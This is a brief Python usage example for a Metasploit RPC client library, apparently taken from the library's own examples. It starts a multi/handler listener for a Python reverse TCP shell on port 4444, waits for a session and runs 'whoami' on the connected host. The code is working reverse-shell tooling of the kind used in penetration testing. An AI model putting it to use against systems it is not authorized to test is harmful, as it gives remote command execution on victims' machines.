import time

from snek_sploit import Client, ModuleType, SessionInformation


if __name__ == '__main__':
    client = Client("msf", "root", disable_https_warnings=True)

    execution = client.modules.rpc.execute(
        ModuleType.exploit,
        "multi/handler",
        {"PAYLOAD": "python/shell_reverse_tcp", "LHOST": "0.0.0.0", "LPORT": 4444}
    )
    print("Listener started!")
    print("Once you connect to it, the script will continue... ")
    # Code used to create the connection can be either generated using the msfvenom
    # or taking a look into tests/e2e/test.py (`create_connection("localhost")`)
    session_to_match = SessionInformation(via_exploit="multi/handler", via_payload="python/shell_reverse_tcp")
    while (sessions := client.sessions.filter(session_to_match)) is None:
        time.sleep(1)

    session_id = list(sessions.keys())[-1]
    shell = client.sessions.get(session_id)
    print(f"Executing command `whoami` in the session {session_id}... ")
    shell.write('whoami')
    time.sleep(3)
    print(f"Result: {shell.read()}")
